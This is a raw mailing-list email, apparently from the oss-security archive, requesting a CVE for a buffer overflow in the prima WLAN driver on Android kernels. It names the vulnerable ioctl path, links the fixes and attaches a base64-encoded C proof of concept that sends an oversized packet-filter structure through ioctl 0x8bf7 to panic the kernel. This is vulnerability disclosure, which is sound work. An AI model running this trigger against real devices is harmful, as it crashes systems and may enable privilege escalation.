X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4407" "Sunday" "24" "January" "2016" "03:51:44" "+0800" "Shawn" "citypw@gmail.com" "<CABniQZOu_2SA++N-KbO72cj1=g9qyTr_kUB3wGBsX4uLhw1JMA@mail.gmail.com>" "108" "[oss-security] CVE request for prima wlan driver: Address buffer overflow due to invalid length" nil nil nil "1" "2016012319:51:44" "[oss-security] CVE request for prima wlan driver: Address buffer overflow due to invalid length" (number mark "U       citypw@gmail Jan 24  108/4407  " thread-indent "\"[oss-security] CVE request for prima wlan driver: Address buffer overflow due to invalid length\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 25862 invoked by uid 550); 23 Jan 2016 19:51:56 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 25841 invoked from network); 23 Jan 2016 19:51:55 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:cc:content-type;
        bh=nuV6eaT880ij5Y+hv2lyLpMbx32CsKXY01O2WaDFxYk=;
        b=CLH21AHabiE1f32WluiuYSOK1CrMPXuQq7eVT8BGzn09B6p8Y8zKWlnHIzKH3cKO+6
         JXHd9mlNvTMVGqjuavBmiXIedr1SZTXJfcViq/qPVxTTxajvF8smydAwLNSBz/GIUAjJ
         +l3ThExLs8qETQIPSS+d4UgB0yMc5Fj0PayxhobMzI61PBd68J9C7myhrzTH9zZfrx3B
         MtFiLi4v/sFvjiB77jpO8n000GJwDl4+tGCvMIxemQxuSE5eSp0Fv9+lQN89I/2Ad9Xe
         jAB/hn8xrH342cz3ubIhGlUTZ41oH1IUDCe0BkKLsu8Gv7KkMGWE+F55slDtWbY7BozF
         mZuA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to:cc
         :content-type;
        bh=nuV6eaT880ij5Y+hv2lyLpMbx32CsKXY01O2WaDFxYk=;
        b=Cb/WjyJJFjdXJDa9Jepi1I7UTsrfYImLx6sFv+sFS0zVpP2jntg+eKNRzcxYGfskNZ
         VSxnkGXXZ/qgmkHnSRh7SDBj+1zg5TOllkgjblGy92nwYo6432pFIIPyE3wHn62xoMHI
         BlTQ6FNCcgAdnpslOpDj9oN/PgPLmjQNyKr+mnaxMstL4l/ZEAeyjA7UthzDtLSMo8N1
         Y/zUCYQEYAa0msFROFnZuF4uEja5eCClh8Baf2jYG/uH4SoWiazm5YYjuqfA58dzX1ZD
         lDcaRKoGIbQk3EK8mKz/DBgD/WCH4kb0jupb7dUxU9SrHlHR0k7psQ50DzQuP7uQqRXQ
         Ljgg==
X-Gm-Message-State: AG10YORTKG2VUHp1OY8LzENMpigWBQF/k5QH1+L4zjfET9XNZULLp7bVAqTd/TI4296Nu6ec5SiV52NqjGwynQ==
MIME-Version: 1.0
X-Received: by 10.194.121.167 with SMTP id ll7mr11164459wjb.113.1453578704347;
 Sat, 23 Jan 2016 11:51:44 -0800 (PST)
Date: Sun, 24 Jan 2016 03:51:44 +0800
Message-ID: <CABniQZOu_2SA++N-KbO72cj1=g9qyTr_kUB3wGBsX4uLhw1JMA@mail.gmail.com>
From: Shawn <citypw@gmail.com>
To: oss-security@lists.openwall.com
Cc: Pray3r Z <pray3r.z@gmail.com>
Content-Type: multipart/mixed; boundary=089e01176019539495052a05aad1
Subject: [oss-security] CVE request for prima wlan driver: Address buffer overflow due to
 invalid length

--089e01176019539495052a05aad1
Content-Type: text/plain; charset=UTF-8

**Introduction***

One exploitable bug has been fixed in prima wlan driver a few months
ago.

Upstream fix:
https://github.com/sonyxperiadev/prima/commit/4b91219ada9e73c897da2e0ae7bf2ff043dde950

Cyanogenmod's backport fix:
https://github.com/CyanogenMod/android_kernel_sony_msm8960t/commit/d58f1eacbdf55946ec7062ab6e4df462bf30ef32

It was lacking a check for valid length of copy a buffer, which can be
crafted by userspace. The application could communicate with wlan
driver via ioctl() with 0x8bf7 to enter into vulnerable code path.

This issue may leads to a local DoS or privilege escalation. Some
android phone/tablet are still using the vulnerable version of prima
driver. We've aware of android-msm-flo-3.4-marshmallow for Nexus 7(
2013) is affected by this isuee:

https://android.googlesource.com/kernel/msm/+/android-msm-flo-3.4-marshmallow

Plz review the file:

msm-kernel/drivers/staging/prima/CORE/HDD/src/wlan_hdd_wext.c


Then we've already sent a patch to backport fix for the branch and
still doesn't get any answer yet:

https://android.googlesource.com/kernel/msm/+/15c8afebed947b30370095cbb7de6257891a3971%5E!/#F0

PoC:

https://raw.githubusercontent.com/hardenedlinux/offensive_poc/master/prima_wlan_poc/wext_poc.c

Panic log:
https://raw.githubusercontent.com/hardenedlinux/offensive_poc/master/prima_wlan_poc/panic.log

Mitigation:

We haven't exmine if this issue can be exploited to gain the root
privileges. But some fancy mitigation like PXN is not support well for
android armv7. Porting PaX UDEREF is an another option.




-- 
GNU powered it...
GPL protect it...
God blessing it...

regards
Shawn

--089e01176019539495052a05aad1
Content-Type: text/x-csrc; charset=US-ASCII; name="wext_poc.c"
Content-Disposition: attachment; filename="wext_poc.c"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_ijrj7isi0

LyoKICogQ29kZXI6IFNoYXduIHRoZSBSMGNrLCBbY2l0eXB3QGdtYWlsLmNv
bV0KICogQ28td29ya2VyOiBQcmF5M3IsIFtwcmF5M3IuekBnbWFpbC5jb21d
CiAqIENvbXBpbGU6CiAqICMgYXJtLWxpbnV4LWFuZHJvaWRlYWJpLWdjYyB3
ZXh0X3BvYy5jIC0tc3lzcm9vdD0kU1lTX1JPT1QgIC1waWUgCiAqICMgLi9h
Lm91dCB3bGFuMAogKiBCb29tLi4uLi4uc2hpdCBoYXBwZW5zWyBhcyBhbHdh
eXNdOy0pCiovCgojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN0cmlu
Zy5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzeXMvaW9jdGwu
aD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8c3lzL3NvY2tl
dC5oPgojaW5jbHVkZSA8bGludXgvd2lyZWxlc3MuaD4KI2luY2x1ZGUgPGVy
cm5vLmg+Cgp0eXBlZGVmIHVuc2lnbmVkIGNoYXIgdl9VOF90OwojZGVmaW5l
IEhERF9NQVhfQ01QX1BFUl9QQUNLRVRfRklMVEVSICAgICA1CgpzdHJ1Y3Qg
UGFja2V0RmlsdGVyUGFyYW1zQ2ZnIHsKCXZfVThfdCBwcm90b2NvbExheWVy
OwoJdl9VOF90IGNtcEZsYWc7Cgl2X1U4X3QgZGF0YU9mZnNldDsKCXZfVThf
dCBkYXRhTGVuZ3RoOwoJdl9VOF90IGNvbXBhcmVEYXRhWzhdOwoJdl9VOF90
IGRhdGFNYXNrWzhdOwp9OwoKdHlwZWRlZiBzdHJ1Y3QgewoJdl9VOF90IGZp
bHRlckFjdGlvbjsKCXZfVThfdCBmaWx0ZXJJZDsKCXZfVThfdCBudW1QYXJh
bXM7CglzdHJ1Y3QgUGFja2V0RmlsdGVyUGFyYW1zQ2ZnCgkgICAgcGFyYW1z
RGF0YVtIRERfTUFYX0NNUF9QRVJfUEFDS0VUX0ZJTFRFUl07Cn0gdFBhY2tl
dEZpbHRlckNmZywgKnRwUGFja2V0RmlsdGVyQ2ZnOwoKaW50IG1haW4oaW50
IGFyZ2MsIGNvbnN0IGNoYXIgKmFyZ3ZbXSkKewoJaWYgKGFyZ2MgIT0gMikg
ewoJCWZwcmludGYoc3RkZXJyLCAiQmFkIHVzYWdlXG4iKTsKCQlmcHJpbnRm
KHN0ZGVyciwgIlVzYWdlOiAlcyBpZm5hbWVcbiIsIGFyZ3ZbMF0pOwoJCXJl
dHVybiAtMTsKCX0KCglzdHJ1Y3QgaXdyZXEgcmVxOwoJc3RyY3B5KHJlcS5p
ZnJfaWZybi5pZnJuX25hbWUsIGFyZ3ZbMV0pOwoJaW50IGZkLCBzdGF0dXMs
IGkgPSAwOwoJZmQgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19ER1JBTSwgMCk7
Cgl0UGFja2V0RmlsdGVyQ2ZnIHBfcmVxOwoKCS8qIGNyYWZ0aW5nIGEgZGF0
YSBzdHJ1Y3R1cmUgdG8gdHJpZ2dlcmluZyB0aGUgY29kZSBwYXRoICovCgly
ZXEudS5kYXRhLnBvaW50ZXIgPQoJICAgIG1hbGxvYyhzaXplb2Yodl9VOF90
KSAqIDMgKwoJCSAgIHNpemVvZihzdHJ1Y3QgUGFja2V0RmlsdGVyUGFyYW1z
Q2ZnKSAqIDUpOwoJcF9yZXEuZmlsdGVyQWN0aW9uID0gMTsKCXBfcmVxLmZp
bHRlcklkID0gMDsKCXBfcmVxLm51bVBhcmFtcyA9IDM7Cglmb3IgKDsgaSA8
IDU7IGkrKykgewoJCXBfcmVxLnBhcmFtc0RhdGFbaV0uZGF0YUxlbmd0aCA9
IDI0MTsKCQltZW1zZXQoJnBfcmVxLnBhcmFtc0RhdGFbaV0uY29tcGFyZURh
dGEsIDB4NDEsIDE2KTsKCX0KCgltZW1jcHkocmVxLnUuZGF0YS5wb2ludGVy
LCAmcF9yZXEsCgkgICAgICAgc2l6ZW9mKHZfVThfdCkgKiAzICsKCSAgICAg
ICBzaXplb2Yoc3RydWN0IFBhY2tldEZpbHRlclBhcmFtc0NmZykgKiA1KTsK
CglpZiAoaW9jdGwoZmQsIDB4OGJmNywgJnJlcSkgPT0gLTEpIHsKCQlmcHJp
bnRmKHN0ZGVyciwgIkZhaWxlZCBpb2N0KCkgZ2V0IG9uIGludGVyZmFjZSAl
czogJXNcbiIsCgkJCWFyZ3ZbMV0sIHN0cmVycm9yKGVycm5vKSk7Cgl9IGVs
c2UgewoJCXByaW50ZigiWW91IHNob3VsZG4ndCBzZWUgdGhpcyBtc2cuLi5c
biIpOwoJfQoKfQo=

--089e01176019539495052a05aad1--
